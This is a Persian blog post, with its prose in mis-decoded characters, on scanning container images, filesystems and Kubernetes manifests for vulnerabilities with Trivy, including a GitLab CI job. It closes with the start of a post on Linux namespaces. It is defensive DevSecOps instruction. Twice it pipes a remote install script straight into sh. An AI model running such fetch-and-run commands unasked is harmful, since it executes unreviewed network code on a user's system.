ุฏููโุชุฑ ุจุง ุงุณุชูุงุฏู ุงุฒ Trivy ูโุชูุงู ุขุณุจโูพุฐุฑโูุง ุฑุง ฺฉู ุฏุฑ ุณุทุญ ุจุณุชูโูุง (Package) ุณุณุชูโุนุงูู ุง ฺฉุชุงุจุฎุงููโูุง ฺฉ ุฒุจุงู ุจุฑูุงููโููุณ ูุฌูุฏ ุฏุงุฑุฏ ุดูุงุณุง ฺฉุฑุฏ.\nูพูุดฺฏุฑโูุง ุงููุช ุจุฑุง ุดูุงุณุง ุขุณุจโูพุฐุฑโูุง ูุงุฒ ุฏุงุฑูุฏ ฺฉู ูุณุฎูโ ุจุณุชูโูุง ู ฺฉุชุงุจุฎุงููโูุง ูุตุจโุดุฏู ุฑุง ุดูุงุณุง ฺฉููุฏ. ุณูพุณ ุจุง ุงุณุชูุงุฏู ุงุฒ ููุฑุณุช ุงุฒ ุขุณุจโูพุฐุฑโูุง ฺฉู ุฏุฑ ุงุฎุชุงุฑ ุฏุงุฑูุฏ (ูุซูุงู ุฏุชุงุจุณ NVD, Red Hat) ุจุณุชูโูุง ู ฺฉุชุงุจุฎุงููโูุง ุขุณุจโูพุฐุฑ ุฑุง ุดูุงุณุง ู ฺฏุฒุงุฑุด ูโฺฉููุฏ. ุจุฑุง ูุซุงู ุจุฑุง ุงุณุชุฎุฑุงุฌ ููุฑุณุช ุจุณุชูโูุง ููุฌูุฏ ุฏุฑ ุณุณุชูโุนุงููโูุง ูโุชูุงููุฏ ุงุฒ ูุณุฑูุง /var/lib/dpkg/ ุง /lib/apk/db/ ุงุทูุงุนุงุช ูุงุฒู ุฑุง ุจูโุฏุณุช ุจุงูุฑูุฏ. ุฏุฑ ุชุตูุฑ ุฒุฑ ฺฉ ููููู ุงุฒ ูุญุชูุงุช ูุงู /var/lib/dpkg/status ููุงุด ุฏุงุฏู ุดุฏู ุงุณุช.\n1 grep Package -A9 /var/lib/dpkg/status ุงฺฏุฑ ุงูุฌ ฺฉ ฺฉุงูุชูุฑ ุจู ุฌูุช ฺฉุงูุด ุญุฌู ุงูุฌ strip ุดุฏู ุจุงุดุฏ ู ุงุทูุงุนุงุช ูุธุฑ ุงุทูุงุนุงุช ููู ุงุฒ ุขู ุญุฐู ุดุฏู ุจุงุดุฏ ุงุญุชูุงูุง Trivy ู ุณุงุฑ ูพูุดฺฏุฑโูุง ูุดุงุจู ุฏุฑ ุงู ูุงุฒ ููโุชูุงููุฏ ุจู ุฏุฑุณุช ุนูู ฺฉููุฏ.\nุจุฑุง ุงุณุชุฎุฑุงุฌ ููุฑุณุช ฺฉุชุงุจุฎุงููโูุง ุงุณุชูุงุฏู ุดุฏู ูุฒ Trivy ุงุฒ ูุงูโูุง ูุนู ุงุณุชูุงุฏู ูโฺฉูุฏ. ููุฑุณุช ุงู ูุงูโูุง ุจุฑ ุงุณุงุณ ุฒุจุงูโูุง ุจุฑูุงููโููุณ ุฏุฑ ุงู ููฺฉ ุขูุฑุฏู ุดุฏู ุงุณุช. ุจุฑุง ูุซุงู ุฏุฑ ูพุงุชูู ูุงูโูุง Pipfile.lock, poetry.lock ู requirements.txt ุฏุฑ ุฒูุงู ูพูุด ูุฎุฒู ุง ูุงูโุณุณุชู ููุฑุฏ ุงุณุชูุงุฏู ูุฑุงุฑ ูโฺฏุฑุฏ.\nุจุฑุง ูพูุด ุงููุช ุงูุฌ ฺฉุงูุชูุฑโูุง ุงุจุฒุงุฑูุง ุฌุงฺฏุฒู ุฏฺฏุฑ ูุธุฑ Clair, Anchore ูุฌูุฏ ุฏุงุฑุฏ. ุฏุฑ ููุงุณูโูุง ุจู ุงู ุงุจุฒุงุฑูุง ุตูุฑุช ฺฏุฑูุชู ุงุณุช. ุบุฑ ุงุฒ ูฺฺฏโูุง ฺฉู ุฏุฑ ุตูุญูโ ูุนุฑู ูพุฑูฺู ุฏุฑ ฺฏุชโูุงุจ ุฏุฑุฌ ุดุฏู ุงุณุชุ ุจุฑ ุงุณุงุณ ุชุฌุฑุจูโ ูุง ูฺฺฏโูุง ุฒุฑ ุฏุฑ Trivy ูุงุจู ุชูุฌู ุงุณุช.\n- ุณุงุฏู ุจูุฏู ุงุณุชูุฑุงุฑ ู ุจฺฉุงุฑฺฏุฑ\n- ุณุฑุนุช ุจุงูุง ุฏุฑ ุงุฌุฑุง ูพูุด\n- ุตุญุช ุนููฺฉุฑุฏ ู ูุฒุงู False/Positive ฺฉูุชุฑ ูุณุจุช ุจู ุงุจุฒุงุฑูุง ูุดุงุจู\n- ุงูุทุจุงู ุจุง ูุฑุขูุฏ CI/CD\nุจุฑุฑุณ ูุงุจูุชโูุง ููู Trivy ุฏุฑ ุงู ูุณูุช ูุงุจูุชโูุง ููู Trivy ูุธุฑ ูพูุด ุงูุฌ ฺฉุงูุชูุฑุ ูพูุด ูุงู ุณุณุชู ู ูพูุด ุชูุธูุงุช ูุงุงูู ุฏุฑ ูุงููุณุชโูุง ุฑุง ุจุง ูุซุงูโ ูุฑูุฑ ูโฺฉูู. ุดูุง ูู ูโุชูุงูุฏ ุจุง ูุตุจ ฺฉุฑุฏู Trivy ุงุฒ ุทุฑู ุฏุณุชูุฑ ุฒุฑ ูุซุงูโูุง ฺฉู ุฏุฑ ุจุฎุด ุจุนุฏ ุขูุฑุฏู ุดุฏู ุงุณุช ุฑุง ุงูุชุญุงู ฺฉูุฏ. ุจุง ุงุฌุฑุง ุฏุณุชูุฑ ุฒุฑ ูุณุฎูโ ฐ.ฒฑ.ฒ ุจุฑ ุฑู ุณุณุชูโุนุงูู ุดูุง ูุตุจ ุฎูุงูุฏ ุดุฏ.\n1 curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin v0.21.2 ูพูุด ุงูุฌ ฺฉุงูุชูุฑ ููุงูโุทูุฑ ฺฉู ุงุดุงุฑู ฺฉุฑุฏู Trivy ฺฉ ุงุจุฒุงุฑ ุจุฑุง ูพูุด ุขุณุจโูพุฐุฑโูุง ุดูุงุฎุชู ุดุฏู ุฏุฑ ุงูุฌ ฺฉุงูุชูุฑูุง ูโุจุงุดุฏ. ุจุฑุง ูพูุด ฺฉ ุงูุฌ ูโุชูุงูู ุงุฒ ุฏุณุชูุฑ ุฒุฑ ุงุณุชูุงุฏู ฺฉูู.\n1 2 3 4 5 6 7 $ trivy image hub.hamdocker.ir/library/httpd:2.4.43 | jq \u0026#34;.Results[].Vulnerabilities[].VulnerabilityID\u0026#34; \u0026#34;CVE-2021-33574\u0026#34; \u0026#34;CVE-2021-35942\u0026#34; \u0026#34;CVE-2020-1751\u0026#34; \u0026#34;quotCVE-2020-1752\u0026#34; ... ุฏุฑ ูุซุงู ุจุงูุง ููุฑุณุช ุขุณุจโูพุฐุฑโูุง ุดูุงุฎุชู ุดุฏู ุงูุฌ httpd ูุณุฎูโ ฒ.ด.ดณ ุงุณุชุฎุฑุงุฌ ุดุฏู ุงุณุช. ุฏุฑ ุฒูุงู ุงุฌุฑุง ูโุชูุงู ุงุฒ ุณูฺโูุง ุฒุฑ ุจุฑุง ููุชุฑ ฺฉุฑุฏู ูพูุด ุงุณุชูุงุฏู ฺฉุฑุฏ.\nููุชุฑ ฺฉุฑุฏู ุขุณุจโูพุฐุฑโูุง ุงุณุชูุงุฏู ุงุฒ ignore-unfixed ุจุฑุง ูุงุฏุฏู ฺฏุฑูุชู ุขุณุจโูพุฐุฑโูุง ฺฉู ูุงูุฏ ูุตูู ูุณุชูุฏ ู ุชุงฺฉููู ุฑูุน ูุดุฏู ุงูุฏ.\n1 $ trivy image hub.hamdocker.ir/library/httpd:2.4.43 --ignore-unfixed ููุชุฑ ฺฉุฑุฏู ุขุณุจโูพุฐุฑโูุง ุจุฑ ุงุณุงุณ ุดุฏุช ุจุง ุงุณุชูุงุฏู ุงุฒ severity. ูุซูุง:\n1 $ trivy image hub.hamdocker.ir/library/httpd:2.4.43 --severity HIGH,CRITICAL --ignore-unfixed ูุดุฎุต ฺฉุฑุฏู ฺฉ ููุฑุณุช ุจุฑุง ูุงุฏุฏู ฺฏุฑูุชู ุขุณุจโูพุฐุฑโูุง ุฎุงุต ุฏุฑ ุฒูุงู ูพูุด . ุจุฑุง ุงูฺฉุงุฑ ุจุงุฏ ุฏุฑ ฺฉ ูุงู ุจู ูุงู .trivyignore ุดูุงุณูโ ุขุณุจโูพุฐุฑโูุง ุฑุง ูุงุฑุฏ ฺฉูู. ูุซูุง:\n1 2 3 $ cat .trivyignore CVE-2021-33574 CVE-2021-35942 ู ุณูพุณ\n1 $ trivy image hub.hamdocker.ir/library/httpd:2.4.43 ุฏุฑ ูุซุงู ุจุงูุง ุฏุฑ ุฒูุงู ูพูุดุ ุขุณุจโูพุฐุฑโูุง CVE-2021-33574 ู CVE-2021-35942 ูุงุฏุฏู ฺฏุฑูุชู ูโุดูุฏ. ููฺูู ุจุง ุงุณุชูุงุฏู ุงุฒ OPA ูโุชูุงูุฏ ููุชุฑ ฺฉุฑุฏู ุขุณุจโูพุฐุฑโูุง ุฑุง ุงูุฌุงู ุฏูุฏ ุง ุจุฑ ุนฺฉุณ ูุซุงู ุจุงูุงุ ุชุนู ฺฉูุฏ ฺฉู ููุท ฺฉ ุขุณุจโูพุฐุฑ ุฎุงุต ูุซู log4shell ุฏุฑ ุงูุฌโูุง ุจุฑุฑุณ ุดูุฏ.\nุงุฎุชุตุงุต ฺฉุฑุฏู ูุฑูุช ุฎุฑูุฌ ููุชุฑ ฺฉุฑุฏู ููุงุด ู ุฐุฎุฑู ฺฉุฑุฏู ุฎุฑูุฌ ุฏุฑ ฺฉ ูุงู ุจุง ุงุณุชูุงุฏู ุงุฒ output ู format\nุจู ุตูุฑุช ูพุดโูุฑุถ Trivy ูุชุฌูโ ุขุฒูุงุด ุฑุง ุฏุฑ ุญุงูุช ุฌุฏูู ูุงููุฏ ุฏุฑ ุฎุฑูุฌ ููุงุด ูโุฏูุฏ. ุจุง ุงุณุชูุงุฏู ุงุฒ format , output ูโุชูุงูุฏ ูุฑูุช ุฎุฑูุฌ ุฑุง ุชุบุฑ ุฏูุฏ. ูุซูุง:\n1 $ trivy image hub.hamdocker.ir/library/httpd:2.4.43 --format json --output result.json ููฺูู ุจุง ุงุณุชูุงุฏู ุงุฒ ูุฑูุช template ูโุชูุงูุฏ ูุฑูุช ุฎุฑูุฌ ุงุฎุชุตุงุต ุฎูุฏุชุงู ุฑุง ุจุณุงุฒุฏ.\nูพูุด ูุงู ุณุณุชู ฺฉ ุฏฺฏุฑ ุงุฒ ูุงุจูุชโูุง ููู Trivy ุงูฺฉุงู ูพูุด ูุงู ุณุณุชู ูโุจุงุดุฏ. ุจุง ุงุณุชูุงุฏู ุงุฒ ุงู ูุงุจูุช ูโุชูุงู ูพฺฉุฌโูุง ููุฑุฏ ุงุณุชูุงุฏู ุฏุฑ ฺฉ ูพุฑูฺู (ุจู ุฌุง ฺฉุงูุชูุฑ) ุฑุง ููุฑุฏ ูพูุด ูุฑุงุฑ ุฏุงุฏ. ุจุฑุง ูุซุงู ุฏุฑ ูพุฑูฺูโ ุฒุฑ ูุณุฎูโูุง ุขุณุจโูพุฐุฑ ฺฉุชุงุจุฎุงููโูุง ูพุฑฺฉุงุฑุจุฑุฏ requests ู pillow ููุฑุฏ ุงุณุชูุงุฏู ูุฑุงุฑ ฺฏุฑูุชู ุงุณุช.\nุจุง ุงุณุชูุงุฏู ุงุฒ ุฏุณุชูุฑ ุฒุฑ ูพุฑูฺู ููุฑุฏ ุขุฒูุงุด ูุฑุงุฑ ฺฏุฑูุชู ุงุณุช. Trivy ุจู ุตูุฑุช ุฎูุฏฺฉุงุฑ ูุงู requirements.txt ุฑุง ุดูุงุณุง ู ุชุฌุฒู ูโฺฉูุฏ ู ุณูพุณ ุงูุฏุงู ุจู ุดูุงุณุง ุขุณุจโูพุฐุฑ ุฏุฑ ูพฺฉุฌโูุง ูโููุงุฏ. ูุณุฑ ูุฑุงุฑ ฺฏุฑูุชู ูุงู requirements.txt ู ุจููโ ูุงูโูุง ูุดุงุจู ุจุฑุง Trivy ุงููุช ูุฏุงุฑุฏ.\n1 $ trivy fs /tmp/vulnerable_app ุงุฒ ููู ูฺฺฏ ูพูุด ูุงู ุณุณุชู ูโุชูุงู ุจุฑุง ุงุฌุฑุง ุนููุงุช ูพูุด ุฏุฑ ุฒูุงู ุณุงุฎุช ุงูุฌ ุง ุฏุฑ ุฏุงุฎู ฺฉ ฺฉุงูุชูุฑ ูุฒ ุงุณุชูุงุฏู ฺฉุฑุฏ. ุจุฑุง ูุซุงู ฺฉ ูุงู requirements.txt ู ฺฉ Dockerfile ุจุง ูุญุชูุงุช ุฒุฑ ุงุฌุงุฏ ฺฉูุฏ:\nrequirements.txt 1 requests==2.6.0 Dockerfile 1 2 3 4 FROM hub.hamdocker.ir/library/python:3.7-alpine3.11 COPY requirements.txt . RUN apk add curl \\ \u0026amp;\u0026amp; curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/master/contrib/install.sh | sh -s -- -b /usr/local/bin \u0026amp;\u0026amp; trivy fs --exit-code 1 --no-progress / ุณูพุณ ุจุง ุฏุณุชูุฑ ุฒุฑ ูุฑุงูุฏ ุณุงุฎุชู (build) ุงูุฌ ุฑุง ูุฑุงุฎูุงู ฺฉูุฏ:\n1 docker build -t test-fs . ุจุนุฏ ุงุฒ ุงุฌุฑุง ุฏุณุชูุฑ ููู ูุฑุงูุฏ ุณุงุฎุชู ุงูุฌ ุจู ุนูุช ูุฌูุฏ ุขุณุจโูพุฐุฑ ุฏุฑ ุจุณุชูโูุง ุณุณุชูโุนุงูู (ูุณุฎูโ ูุฏู Alpine) ู ูููโุทูุฑ ุขุณุจโูพุฐุฑ CVE-2018-18074 ุฏุฑ ฺฉุชุงุจุฎุงููโ requests ุจุง ุฎุทุง ุฎุงุชูู ูโุจุงุฏ. ุฏุฑ ุชุตุงูุฑ ุฒุฑ ุงู ููุฑุฏ ููุงุด ุฏุงุฏู ุดุฏู ุงุณุช.\nูพูุด ุชูุธูุงุช ูุงุงูู (Misconfiguration) ุชูุงูุง ุดูุงุณุง misconfiguration ุฏุฑ ุณุทุญ ูุงูโูุง ุชูุธูุงุช (ูุงููุณุชโูุง) ูุฑุจูุท ุจู Docker, Kubernetes, Terrafrom ู \u0026hellip; ูุงุจูุช ุจุณุงุฑ ููู ุฏฺฏุฑ ุงุณุช ฺฉู ุฏุฑ Trivy ูพุงุฏูโุณุงุฒ ุดุฏู ุงุณุช. ุจุง ุงุณุชูุงุฏู ุงุฒ conf ูโุชูุงู ุชูุธูุงุช ุฎุทุฑูุงฺฉ ุฏุฑ ุงู ูุงูโูุง ุฑุง ุดูุงุณุง ฺฉุฑุฏ. ุจุฑุง ูุซุงู ุฏุฑ ุฒุฑ ูุงููุณุช ุณุงุฎุช ฺฉ ูพุงุฏ ุฏุฑ Kubernetes ูุดุงู ุฏุงุฏู ุดุฏู ุงุณุช. ุฏุฑ ุชุนุฑู ุงู ูพุงุฏ ุฏู ููุฑุฏ ูุงุงูู ุงุณุชูุงุฏู ุดุฏู ุงุณุช.\nููุฑุฏ ุงูู ุงุณุชูุงุฏู ุงุฒ capability SYS_ADMIN ู ููุฑุฏ ุฏูู ุงุฌุฑุง ฺฉุงูุชูุฑ ุฏุฑ ุญุงูุช privileged ูโุจุงุดุฏ. ุจุง ุงุณุชูุงุฏู ุงุฒ conf ุฏุฑ ูุณุฑ ุฌุงุฑ ฺฉู ูุงู ุชุนุฑู ูพุงุฏ ุฏุฑ ุขู ูุฑุงุฑ ุฏุงุฑุฏ ุฑุง ููุฑุฏ ุขุฒูุงุด ูุฑุงุฑ ูโุฏูู:\n1 $ trivy conf --severity HIGH . ููุงูโุทูุฑ ฺฉู ุฏุฑ ุชุตูุฑ ุจุงูุง ูุดุงูุฏู ูโฺฉูุฏ Trivy ูุงูโูุง ููุฌูุฏ ุฏุฑ ูุณุฑ ุฌุงุฑ ุฑุง ุชุฌุฒู ฺฉุฑุฏู ู ููุน ุขูโูุง ุฑุง ูุฒ ุจู ุฏุฑุณุช ุงุฒ ููุน ูุงููุณุชโูุง Kubernetes ุชุดุฎุต ุฏุงุฏู ู ูุฑ ุฏู ุชูุธู ูุงุงูู ุฑุง ูุฒ ุดูุงุณุง ฺฉุฑุฏู ุงุณุช. ุฏุฑ ูุณุฑ ฺฉู ุจุฑุง ูพูุด ุชุนู ูโฺฉูู ุงฺฏุฑ ูุงูโูุง ุฏฺฏุฑ ูุฒ ูุฌูุฏ ุฏุงุดุชู ุจุงุดุฏ Trivy ูโุชูุงูุฏ ุขููุง ุฑุง ุดูุงุณุง ู ุชุญูู ฺฉูุฏ. ุจุฑุง ุชุณูุท ุจุดุชุฑ ุจุฑ ุงู ูุงุจูุช ูพุดููุงุฏ ูโฺฉูู ูุซุงูโูุง ฺฉู ุฏุฑ ูุฎุฒู ูพุฑูฺู ุขูุฑุฏู ุดุฏู ุงุณุช ุฑุง ูุทุงูุนู ฺฉูุฏ. ููฺูู ุจุฑุง ุขุดูุง ุจุง ุณุงุฑ ูฺฺฏโูุง ูุธุฑ ุญุงูุช client/server ู ููฺูู ูุทุงูุนูโ ุฏููโุชุฑ ุฑุงุฌุน ุจู ุขููุง ูโุชูุงูุฏ ุจู ุขุฎุฑู ูุณุฎูโ ูุณุชูุฏุงุช ูพุฑูฺู Trivy ุฏุฑ ุงูุฌุง ูุฑุงุฌุนู ฺฉูุฏ.\nุงุณุชูุงุฏู ุงุฒ Trivy ุฏุฑ ูุฑุงูุฏ CI/CD ุฏุฑ ฺุฑุฎูโ ุชูุณุนูโ ูุฑูโุงูุฒุงุฑุ ุงฺฏุฑ ุชุณุช ุงููุช ุงุฒ ฺฏุงูโูุง ุงููู ู ุจูโุตูุฑุช ูุฏุงูู ุงูุฌุงู ุดูุฏ ุงุซุฑฺฏุฐุงุฑ ุจุณุงุฑ ุฒุงุฏ ุฎูุงูุฏ ุฏุงุดุช. ุจุฑุง ุฎูุฏฺฉุงุฑ ฺฉุฑุฏู ูพูุด ุงูุฌ ฺฉุงูุชูุฑูุงุ ุฏุฑ ฺุฑุฎูโ CI/CD ู ููฺฏุงู ุณุงุฎุช ุงูุฌโูุงุ ุจุฑุฑุณโูุง ูุงุฒู ุฑุง ุงูุฌุงู ุฏูุฏ ู ุฏุฑ ุตูุฑุช ฺฉุดู ุขุณุจโูพุฐุฑ ุงุฒ ุงูุชุดุงุฑ ูุณุฎูโ ูุงุงูู ุฌููฺฏุฑ ฺฉูุฏ.\nุฏุฑ GitLab ุ ุฏุฑ ูุงู .gitlab-ci.yml ฺฉ ูุงุฒ ุจุฑุง ูพูุด ุขุณุจโูพุฐุฑโูุง ุชุนุฑู ฺฉูุฏ. ููููู ุฒุฑุ ูพุณ ุงุฒ build ู push ุงูุฌุ ุฏุฑ ูุงุฒ test ูพูุด ุฑุง ุงูุฌุงู ูโุฏูุฏ:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 stages: - build - test build: stage: build image: docker:stable script: - export IMAGE=\u0026#34;registry.hamdocker.ir/GROUP_NAME/PROJECT_NAME\u0026#34; - docker login -u \u0026#34;$REGISTRY_USER\u0026#34; -p \u0026#34;$REGISTRY_PASSWORD\u0026#34; \u0026#34;$REGISTRY\u0026#34; - docker build -t PROJECT_NAME:$CI_COMMIT_SHORT_SHA . - docker image tag PROJECT_NAME:$CI_COMMIT_SHORT_SHA $IMAGE:$CI_COMMIT_SHORT_SHA - docker image push $IMAGE:$CI_COMMIT_SHORT_SHA container_scanning: stage: test image: name: hub.hamdocker.ir/aquasec/trivy:latest entrypoint: [\u0026#34;\u0026#34;] variables: GIT_STRATEGY: none TRIVY_USERNAME: \u0026#34;$REGISTRY_USER\u0026#34; TRIVY_PASSWORD: \u0026#34;$REGISTRY_PASSWORD\u0026#34; TRIVY_AUTH_URL: \u0026#34;$REGISTRY\u0026#34; FULL_IMAGE_NAME: registry.hamdocker.ir/GROUP_NAME/PROJECT_NAME:$CI_COMMIT_SHORT_SHA script: - trivy --version # ูพุงฺฉุณุงุฒ ฺฉุด ุงูุฌโูุง (ูพุงฺฏุงูโุฏุงุฏู ุญุฐู ููโุดูุฏ) - trivy image --clear-cache # ุจูโุฑูุฒุฑุณุงู ุฏุชุงุจุณ ุขุณุจโูพุฐุฑโูุง - trivy image --download-db-only --no-progress --cache-dir .trivycache/ # ุชููุฏ ฺฏุฒุงุฑุด GitLab - trivy image --exit-code 0 --cache-dir .trivycache/ --no-progress \\ --format template --template \u0026#34;@/contrib/gitlab.tpl\u0026#34; \\ --output \u0026#34;gl-container-scanning-report.json\u0026#34; \u0026#34;$FULL_IMAGE_NAME\u0026#34; # ุดฺฉุณุช Job ุฏุฑ ุตูุฑุช ูุฌูุฏ CRITICAL - trivy image --exit-code 1 --cache-dir .trivycache/ --severity CRITICAL --no-progress \u0026#34;$FULL_IMAGE_NAME\u0026#34; cache: paths: - .trivycache/ artifacts: when: always paths: - gl-container-scanning-report.json reports: container_scanning: gl-container-scanning-report.json only: refs: - master ุจุฑุง ุงุณุชูุงุฏู ุงุฒ ุงู ูุซุงู ุจุงุฏ ุฏุฑ ูุณูุช variables ุฏุฑ ุชุนุฑู FULL_IMAGE_NAME ูุงู ฺฏุฑูู ู ูุงู ูพุฑูฺู ุฑุง ูุงุฑุฏ ฺฉูุฏ. ูุซูุง ุจู ุตูุฑุช ุฒุฑ\n1 FULL_IMAGE_NAME: registry.hamdocker.ir/milad/myapp:$CI_COMMIT_SHORT_SHA ูพุณ ุงุฒ ุงุถุงูู ฺฉุฑุฏู ุงู ูุงุฒ ูพุณ ุงุฒ ูุฑ commit ุฏุฑ ูุฎุฒู ูุฑุขูุฏ build ุงุฌุฑุง ูโุดูุฏ ู ุจุนุฏ ุงุฒ ุขู ุฏุฑ ูุฑุขูุฏ test ุนููุงุช ูพูุด ุงููุช ุงูุฌ ฺฉุงูุชูุฑ ุตูุฑุช ูโฺฏุฑุฏ. ุฏุฑ ุงู ูุงุฒ ุจุนุฏ ุงุฒ ุขูพุฏุช ฺฉุฑุฏู ุฏุชุงุจุณ Trivy ูพูุด ฺฉุงูู ุงูุฌ ุตูุฑุช ูโฺฏุฑุฏ ฺฉู ูุชุฌูโ ุงุฌุฑุง ุขู ุฏุฑ ูุงู gl-container-scanning-report.json ุฐุฎุฑู ูโุดูุฏ. ุฏุฑ ุชุตูุฑ ุฒุฑ ูุดุงูุฏู ูโฺฉูู ฺฉู ูุฑุขูุฏ ูพูุด ุงููุช ุจู ุฏูู ูุฌูุฏ ุขุณุจโูพุฐุฑ ุจุง ุฎุทุง ุฎุงุชูู ุงูุชู ุงุณุช. ุฏุฑ ุณูุช ุฑุงุณุช ุฏุฑ ูุณูุช Job artifact ูโุชูุงูุฏ ฺฏุฒุงุฑุด ูพูุด ุฑุง ุฏุงูููุฏ ู ูุดุงูุฏู ฺฉูุฏ.\nููฺูู ฺฏุฒุงุฑุด ุงู ูพูุด ุฏุฑ ุจุฎุด Security Dashboard \u0026gt; Vulnerability Report ุฏุฑ ุฏุณุชุฑุณ ูโุจุงุดุฏ.\nุฏุฑ ุชุตูุฑ ุจุงูุง ูุดุงูุฏู ูโฺฉูู ฺฉู ุขุณุจโูพุฐุฑโูุง ฺฉุดู ุดุฏู ุฏุฑ ูุฑุขูุฏ CI/CD ุฏุฑ ูุณูุช Vulnerability Report ุขูุฑุฏู ุดุฏู ุงุณุช ฺฉู ุจุฑุง ุงูุฑุงุฏ ุฏุฎู ุฏุฑ ูพุฑูฺู ูุงุจู ูพฺฏุฑ ูโุจุงุดุฏ.\nููุงูโุทูุฑ ฺฉู ุงุดุงุฑู ุดุฏ ุจุง ูุฑุจุงุฑ commit ฺฉุฑุฏู ุฏุฑ ูุฎุฒู ุงู ูุฑุขูุฏ ุงุฌุฑุง ุฎูุงูุฏ ุดุฏ ู ุงฺฏุฑ ูพุฑูฺู ุฏุงุฑุง ุขุณุจโูพุฐุฑ ุจุง ุฏุฑุฌูโ CRITICAL ุจุงุดุฏุ job ูุนู ุจุง ุฎุทุง ุฎุงุชูู ูโุงุจุฏ ู ูุฑุขูุฏ deploy ุตูุฑุช ูุฎูุงูุฏ ฺฏุฑูุช.\nูุชุฌูโฺฏุฑ ุฏุฑ ุงู ููุดุชุงุฑ ุฏุฏู ฺฉู ุงุณุชูุงุฏู ุงุฒ ุงุจุฒุงุฑ Trivy ุณุงุฏู ุงุณุช ู ุจู ุฑุงุญุช ูโุชูุงู ุงุฒ ุขู ุฏุฑ ุชูุณุนูโ ฺฉ ูพุฑูฺูโ ู ูุฑุขูุฏ CI/CD ุงุณุชูุงุฏู ฺฉุฑุฏ. ุจุฑูุฒ ุจูุฏู ุงู ุงุจุฒุงุฑูุง ู ูุฏุฑุชโุดุงู ุฏุฑ ุชุดุฎุต ูพฺฉุฌโูุง ู ูุงุจุณุชฺฏโูุง ุฏุฑ ุณุทุญ ุณุณุชูโุนุงูู ู ุฒุจุงูโูุง ุจุฑูุงููโููุณ ุจุณุงุฑ ูุงุจู ุงุชฺฉุงุณุชุ ฺฉู ุจุง ุจูุฑูโฺฏุฑ ุงุฒ ุขููุง ุจุฎุด ุฒุงุฏ ุงุฒ ุขุณุจโูพุฐุฑโูุง ุจู ุณุฑุนุช ุฏุฑ ูุงุฒ ุชูุณุนู ฺฉุดู ูโุดููุฏ ู ุงุฒ ุงูุชุดุงุฑ ูุณุฎูโ ูุงุงูู ุฌููฺฏุฑ ุฎูุงูุฏ ุดุฏ. ุฏุฑ ูุธุฑ ุฏุงุดุชู ุจุงุดุฏ ฺฉู ููฺฉู ุงุณุช ุญุช ูพุณ ุงุฒ ุงูุชุดุงุฑ ฺฉ ูุณุฎู ูุฒ ุขุณุจโูพุฐุฑโูุง ุฏุฑ ุจุณุชูโูุง ู ฺฉุชุงุจุฎุงููโูุง ฺฉุดู ุดูุฏ. ุฏุฑ ุงู ุดุฑุงุท ูพุดููุงุฏ ูโุดูุฏ ฺฉู ุจุง ุฎูุฏฺฉุงุฑ ฺฉุฑุฏู ูุฑุขูุฏ ุชุณุชุ ุจู ุตูุฑุช ูพูุณุชู ุฏุฑ ุฒูุงูโูุง ูุนู ุฏุฑ ุทูู ุฑูุฒ ูููโ ฺฉุงูุชูุฑโูุง ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ฺฉูุงุณุชุฑ ุฑุง ุงุฒ ุฌูุจูโ ุงููุช ุชุณุช ฺฉูุฏ.\n","date":"2021-12-20T16:50:24Z","image":"https://fa.miladbr.uk/p/%D9%BE%D9%88%DB%8C%D8%B4-%D8%A7%D9%85%D9%86%DB%8C%D8%AA%DB%8C-%D8%A7%DB%8C%D9%85%DB%8C%D8%AC-%D8%A8%D8%A7-trivy/cover_hu_b3296cbb5eeef181.png","permalink":"https://fa.miladbr.uk/p/%D9%BE%D9%88%DB%8C%D8%B4-%D8%A7%D9%85%D9%86%DB%8C%D8%AA%DB%8C-%D8%A7%DB%8C%D9%85%DB%8C%D8%AC-%D8%A8%D8%A7-trivy/","title":"ูพูุด ุงููุช ุจุฑูุงููโูุง ฺฉุงูุชูุฑ ุดุฏู ุฏุฑ ฺุฑุฎูโ CI/CD"},{"content":" ุฏุฑ ุงู ููุดุชุงุฑ ุฏุฑ ุฏู ูุณูุช ุจู ุจุฑุฑุณ ูุถุงูุงูโูุง ุฏุฑ ูููฺฉุณ ู ุฌุฒุฆุงุช ุงุฒููู ฺฉุฑุฏู ูพุฑุฏุงุฒู ูพุฑุฏุงุฎุชูโุงู. ุขุดูุง ุจุง ุงู ุฌุฒุฆุงุช ฺฉูฺฉ ูโฺฉูุฏ ฺฉู ุฏุฑฺฉ ุฏุฑุณุชโุชุฑ ุงุฒ ฺฉุงูุชูุฑ ฺฉุฑุฏู ฺฉ ูพุฑุฏุงุฒู ุชูุณุท ุชฺฉููููฺโูุง ูุซู ุฏุงฺฉุฑ ุฏุงุดุชู ุจุงุดู. ุฏุฑ ูุณูุช ุงูู ุงู ููุดุชุงุฑ ูุถุงูุงูโูุง utsุ pidุ mount ู network ุฑุง ููุฑุฏ ุจุฑุฑุณ ูุฑุงุฑ ุฏุงุฏู. ุฏุฑ ุงู ูุณูุช ุจู ุจุฑุฑุณ ูุถุงูุงูโูุง userุ ipcุ cgroup ู time ูโูพุฑุฏุงุฒู.\nูุถุงูุงู ฺฉุงุฑุจุฑ (user) ุงู ูุถุงโูุงู ุจู ูพุฑุฏุงุฒูโูุง ุงุฌุงุฒู ูโุฏูุฏ ฺฉู User ID ู Group ID ุฌุฏุง ุงุฒ ูุฒุจุงู ุฏุงุดุชู ุจุงุดูุฏ. ูููโุชุฑู ูุฒุช ฺฉู ุงู ุณุทุญ ุงุฒ ุงุฒููู ฺฉุฑุฏู ูุฑุงูู ูโฺฉูุฏ ุงู ุงุณุช ฺฉู ุฏุฑ ุฏุงุฎู ฺฉุงูุชูุฑ ูโุชูุงู ฺฉุงุฑุจุฑ ฺฉ root ุฏุงุดุช ฺฉู ุฎุงุฑุฌ ุงุฒ ฺฉุงูุชูุฑ ฺฉ ฺฉุงุฑุจุฑ ุบุฑ root ุจุงุดุฏ. ฺฉ ุงุฒ ฺุงูุดโูุง ุงููุช ฺฉุงูุชูุฑูุง ุฏูุฑ ุฒุฏู ูฺฉุงูุฒูโูุง ุงููุช (ูุซูุง container escape) ู ุฏุณุชุฑุณ ุจู ูุฒุจุงู ุงุณุช. ุงุฒ ููุธุฑ ุงููุช ุงู ฺฉ ูฺฺฏ ฺฉูุฏ ุงุณุช ฺฉู 